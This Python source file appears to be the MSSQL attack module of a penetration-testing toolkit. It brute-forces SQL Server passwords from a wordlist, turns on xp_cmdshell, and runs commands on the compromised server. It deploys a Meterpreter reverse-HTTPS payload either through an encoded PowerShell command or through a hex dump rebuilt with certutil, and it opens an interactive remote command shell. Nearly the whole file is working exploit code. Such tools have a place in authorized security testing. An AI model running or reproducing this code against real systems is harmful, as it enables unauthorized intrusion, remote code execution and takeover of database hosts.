#!/usr/bin/env python
# coding=utf-8
import _mssql
import binascii
import os
import shutil
import subprocess
import thread
import time
import pexpect
import src.core.setcore as core
import impacket.tds as tds

#from src.core.payloadgen import create_payloads

# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass

#
# this is the mssql modules
#
# define the base path
definepath = core.definepath()
operating_system = core.check_os()
msf_path = core.meta_path()


#
# this is the brute forcer
#
def brute(ipaddr, username, port, wordlist):
    # if ipaddr being passed is invalid
    if ipaddr == "":
        return False

    if ":" in ipaddr:
        ipaddr = ipaddr.split(":")
        ipaddr, port = ipaddr

    ipaddr = str(ipaddr)
    port = str(port)

    # base counter for successful brute force
    counter = 0
    # build in quick wordlist
    if wordlist == "default":
        wordlist = "src/fasttrack/wordlist.txt"

    # read in the file
    successful_password = None
    with open(wordlist) as passwordlist:
        for password in passwordlist:
            password = password.rstrip()
            # try actual password
            try:
                # connect to the sql server and attempt a password

                print("Attempting to brute force {bold}{ipaddr}:{port}{endc}"
                      " with username of {bold}{username}{endc}"
                      " and password of {bold}{passwords}{endc}".format(ipaddr=ipaddr,
                                                                        username=username,
                                                                        passwords=password,
                                                                        port=port,
                                                                        bold=core.bcolors.BOLD,
                                                                        endc=core.bcolors.ENDC))

                target_server = _mssql.connect("{0}:{1}".format(ipaddr, port),
                                               username,
                                               password)
                if target_server:
                    core.print_status("\nSuccessful login with username {0} and password: {1}".format(username,
                                                                                                      password))
                    counter = 1
                    successful_password = password
                    break

            # if login failed or unavailable server
            except:
                pass

    # if we brute forced a machine
    if counter == 1:
        return ",".join([ipaddr, username, port, successful_password])
    # else we didnt and we need to return a false
    else:
        if ipaddr:
            core.print_warning("Unable to guess the SQL password for {0} with username of {1}".format(ipaddr, username))
        return False


#
# this will deploy an already prestaged executable that reads in hexadecimal and back to binary
#
def deploy_hex2binary(ipaddr, port, username, password):
    # base variable used to select payload option
    option = None
    choice1 = "1"

    conn = _mssql.connect("{0}:{1}".format(ipaddr, port),
                          username,
                          password)
    core.print_status("Enabling the xp_cmdshell stored procedure...")
    try:
        conn.execute_query("exec master.dbo.sp_configure 'show advanced options',1;"
                           "GO;"
                           "RECONFIGURE;"
                           "GO;"
                           "exec master.dbo.sp_configure 'xp_cmdshell', 1;"
                           "GO;"
                           "RECONFIGURE;"
                           "GO")
    except:
        pass
    # just throw a simple command via powershell to get the output
    try:
        print("""Pick which deployment method to use. The first is PowerShell and should be used on any modern operating system. The second method will use the certutil method to convert a binary to a binary.\n""")

        choice = input("Enter your choice:\n\n"
                       "1.) Use PowerShell Injection (recommended)\n"
                       "2.) Use Certutil binary conversion\n\n"
                       "Enter your choice [1]:")
        if choice == "":
            choice = "1"
        if choice == "1":
            core.print_status("Powershell injection was selected to deploy to the remote system (awesome).")
            option_ps = input("Do you want to use powershell injection? [yes/no]:")
            if option_ps.lower() == "" or option_ps == "y" or option_ps == "yes":
                option = "1"
                core.print_status("Powershell delivery selected. Boom!")
            else:
                option = "2"

        # otherwise, fall back to the older version using debug conversion via hex
        else:
            core.print_status("Powershell not selected, using debug method.")
            option = "2"

    except Exception as err:
        print(err)
    payload_filename = None

    # if we don't have powershell
    if option == "2":
        # give option to use msf or your own
        core.print_status("You can either select to use a default "
                          "Metasploit payload here or import your "
                          "own in order to deliver to the system. "
                          "Note that if you select your own, you "
                          "will need to create your own listener "
                          "at the end in order to capture this.\n\n")
        choice1 = input("1.) Use Metasploit (default)\n"
                        "2.) Select your own\n\n"
                        "Enter your choice[1]:")

        if choice1 == "":
            choice1 = "1"

        if choice1 == "2":
            attempts = 0
            while attempts <= 2:
                payload_filename = input("Enter the path to your file you want to deploy to the system (ex /root/blah.exe):")
                if os.path.isfile(payload_filename):
                    break
                else:
                    core.print_error("File not found! Try again.")
                    attempts += 1
            else:
                core.print_error("Computers are hard. Find the path and try again. Defaulting to Metasploit payload.")
                choice1 = "1"

        if choice1 == "1":
            web_path = None

            #prep_powershell_payload()
            import src.core.payloadgen.create_payloads

            # if we are using a SET interactive shell payload then we need to make
            # the path under web_clone versus ~./set
            if os.path.isfile(os.path.join(core.userconfigpath, "set.payload")):
                web_path = os.path.join(core.userconfigpath, "web_clone")
                # then we are using metasploit
            else:
                if operating_system == "posix":
                    web_path = core.userconfigpath
                    # if it isn't there yet
                    if not os.path.isfile(core.userconfigpath + "1msf.exe"):
                        # move it then
                        subprocess.Popen("cp %s/msf.exe %s/1msf.exe" %
                                         (core.userconfigpath, core.userconfigpath), shell=True).wait()
                        subprocess.Popen("cp %s/1msf.exe %s/ 1> /dev/null 2> /dev/null" %
                                         (core.userconfigpath, core.userconfigpath), shell=True).wait()
                        subprocess.Popen("cp %s/msf2.exe %s/msf.exe 1> /dev/null 2> /dev/null" %
                                         (core.userconfigpath, core.userconfigpath), shell=True).wait()
            payload_filename = os.path.join(web_path + "1msf.exe")

        with open(payload_filename, "rb") as fileopen:
            # read in the binary
            data = fileopen.read()
            # convert the binary to hex
            data = binascii.hexlify(data)
            # we write out binary out to a file

        with open(os.path.join(core.userconfigpath, "payload.hex"), "w") as filewrite:
            filewrite.write(data)

        if choice1 == "1":
            # if we are using metasploit, start the listener
            if not os.path.isfile(os.path.join(core.userconfigpath, "set.payload")):
                if operating_system == "posix":
                    try:
                        core.module_reload(pexpect)
                    except:
                        import pexpect
                        core.print_status("Starting the Metasploit listener...")
                        msf_path = core.meta_path()
                        child2 = pexpect.spawn("{0} -r {1}\r\n\r\n".format(os.path.join(core.meta_path() + "msfconsole"),
                                                                        os.path.join(core.userconfigpath, "meta_config")))

        # random executable name
        random_exe = core.generate_random_string(10, 15)

    #
    # next we deploy our hex to binary if we selected option 1 (powershell)
    #
    if option == "1":
        core.print_status("Using universal powershell x86 process downgrade attack..")
        payload = "x86"

        # specify ipaddress of reverse listener
        ipaddr = core.grab_ipaddress()
        core.update_options("IPADDR=" + ipaddr)
        port = input(core.setprompt(["29"], "Enter the port for the reverse [443]"))

        if not port:
            port = "443"

        core.update_options("PORT={0}".format(port))
        core.update_options("POWERSHELL_SOLO=ON")
        core.print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")

        #with open(os.path.join(core.userconfigpath, "payload_options.shellcode"), "w") as filewrite:
        # format needed for shellcode generation
        filewrite = open(core.userconfigpath + "payload_options.shellcode", "w")
        filewrite.write("windows/meterpreter/reverse_https {0},".format(port))
        filewrite.close()

        try:
            core.module_reload(src.payloads.powershell.prep)
        except:
            import src.payloads.powershell.prep

        # launch powershell
        # create the directory if it does not exist
        if not os.path.isdir(os.path.join(core.userconfigpath, "reports/powershell")):
            os.makedirs(os.path.join(core.userconfigpath, "reports/powershell"))

        x86 = open(core.userconfigpath + "x86.powershell").read().rstrip()
        x86 = core.powershell_encodedcommand(x86)
        core.print_status("If you want the powershell commands and attack, "
                          "they are exported to {0}".format(os.path.join(core.userconfigpath, "reports/powershell")))
        filewrite = open(core.userconfigpath + "reports/powershell/x86_powershell_injection.txt", "w")
        filewrite.write(x86)
        filewrite.close()

        # if our payload is x86 based - need to prep msfconsole rc
        if payload == "x86":
            powershell_command = x86
            filewrite = open(core.userconfigpath + "reports/powershell/powershell.rc", "w")
            filewrite.write("use multi/handler\n"
                                "set payload windows/meterpreter/reverse_https\n"
                                "set lport {0}\n"
                                "set LHOST 0.0.0.0\n"
                                "exploit -j".format(port))
            filewrite.close()

        else:
            powershell_command = None

        # grab the metasploit path from config or smart detection
        msf_path = core.meta_path()
        if operating_system == "posix":

            try:
                core.module_reload(pexpect)
            except:
                import pexpect

            core.print_status("Starting the Metasploit listener...")
            child2 = pexpect.spawn("{0} -r {1}".format(os.path.join(msf_path + "msfconsole"),
                                                     os.path.join(core.userconfigpath, "reports/powershell/powershell.rc")))
            core.print_status("Waiting for the listener to start first before we continue forward...")
            core.print_status("Be patient, Metasploit takes a little bit to start...")
            #child2.expect("Starting the payload handler", timeout=30000)
            child2.expect("Processing", timeout=30000)
            core.print_status("Metasploit started... Waiting a couple more seconds for listener to activate..")
            time.sleep(5)

        # assign random_exe command to the powershell command
        random_exe = powershell_command

    #
    # next we deploy our hex to binary if we selected option 2 (debug)
    #

    if option == "2":

        # here we start the conversion and execute the payload
        core.print_status("Sending the main payload via to be converted back to a binary.")
        # read in the file 900 bytes at a time
        #with open(os.path.join(core.userconfigpath, 'payload.hex'), 'r') as fileopen:
        fileopen = open(core.userconfigpath + 'payload.hex', "r")
        core.print_status("Dropping initial begin certificate header...")
        conn.execute_query("exec master ..xp_cmdshell 'echo -----BEGIN CERTIFICATE----- > {0}.crt'".format(random_exe))
        while fileopen:
            data = fileopen.read(900).rstrip()
            #for data in fileopen.read(900).rstrip():
            if data == "":
                break

            core.print_status("Deploying payload to victim machine (hex): {bold}{data}{endc}\n".format(bold=core.bcolors.BOLD,
                                                                                                       data=data,
                                                                                                       endc=core.bcolors.ENDC))

            conn.execute_query("exec master..xp_cmdshell 'echo {data} >> {exe}.crt'".format(data=data,
                                                                                            exe=random_exe))
        core.print_status("Delivery complete. Converting hex back to binary format.")
        core.print_status("Dropping end header for binary format conversion...")
        conn.execute_query("exec master ..xp_cmdshell 'echo -----END CERTIFICATE----- >> {0}.crt'".format(random_exe))
        core.print_status("Converting hex binary back to hex using certutil - Matthew Graeber man crush enabled.")
        conn.execute_query("exec master..xp_cmdshell 'certutil -decode {0}.crt {0}.exe'".format(random_exe))
        core.print_status("Executing the payload - magic has happened and now its time for that moment.. "
                          "You know. When you celebrate. Salute to you ninja - you deserve it.")
        conn.execute_query("exec master..xp_cmdshell '{0}.exe'".format(random_exe))
        # if we are using SET payload
        if choice1 == "1":
            if os.path.isfile(os.path.join(core.userconfigpath, "set.payload")):
                core.print_status("Spawning separate child process for listener...")
                try:
                    shutil.copyfile(os.path.join(core.userconfigpath, "web_clone/x"), definepath)
                except:
                    pass

                # start a threaded webserver in the background
                subprocess.Popen("python src/html/fasttrack_http_server.py", shell=True)
                # grab the port options

                # if core.check_options("PORT=") != 0:
                #     port = core.heck_options("PORT=")
                #
                # # if for some reason the port didnt get created we default to 443
                # else:
                #     port = "443"

    # thread is needed here due to the connect not always terminating thread,
    # it hangs if thread isnt specified
    try:
        core.module_reload(thread)
    except:
        import thread

    # execute the payload
    # we append more commands if option 1 is used
    if option == "1":
        core.print_status("Triggering the powershell injection payload... ")
        # remove encoding
        if "toString" in powershell_command:
            powershell_command = powershell_command.split(".value.toString() '")[1].replace("'", "")
            powershell_command = 'powershell -enc "' + powershell_command

        sql_command = ("exec master..xp_cmdshell '{0}'".format(powershell_command))
        thread.start_new_thread(conn.execute_query, (sql_command,))

    # using the old method
    if option == "2":
        core.print_status("Triggering payload stager...")
        alphainject = ""
        if os.path.isfile(os.path.join(core.userconfigpath, "meterpreter.alpha")):
            with open(os.path.join(core.userconfigpath, "meterpreter.alpha")) as fileopen:
                alphainject = fileopen.read()

        sql_command = ("xp_cmdshell '{0}.exe {1}'".format(random_exe, alphainject))
        # start thread of SQL command that executes payload
        thread.start_new_thread(conn.execute_query, (sql_command,))
        time.sleep(1)

    # if pexpect doesnt exit right then it freaks out
    if choice1 == "1":
        if os.path.isfile(os.path.join(core.userconfigpath, "set.payload")):
            os.system("python ../../payloads/set_payloads/listener.py")
        try:
            # interact with the child process through pexpect
            child2.interact()
            try:
                os.remove("x")
            except:
                pass
        except:
            pass


#
# this will deploy an already prestaged executable that reads in hexadecimal and back to binary
#
def cmdshell(ipaddr, port, username, password, option):
    # connect to SQL server
    mssql = tds.MSSQL(ipaddr, int(port))
    mssql.connect()
    mssql.login("master", username, password)
    core.print_status("Connection established with SQL Server...")
    core.print_status("Attempting to re-enable xp_cmdshell if disabled...")
    try:
        mssql.sql_query("exec master.dbo.sp_configure 'show advanced options',1;"
                        "RECONFIGURE;"
                        "exec master.dbo.sp_configure 'xp_cmdshell', 1;"
                        "RECONFIGURE;")
    except:
        pass
    core.print_status("Enter your Windows Shell commands in the xp_cmdshell - prompt...")

    while True:
        # prompt mssql
        cmd = input("mssql>")
        # if we want to exit
        if cmd == "quit" or cmd == "exit":
            break
        # if the command isnt empty
        elif cmd:
            # execute the command
            mssql.sql_query("exec master..xp_cmdshell '{0}'".format(cmd))
            # print the rest of the data
            mssql.printReplies()
            mssql.colMeta[0]['TypeData'] = 80 * 2
            mssql.printRows()
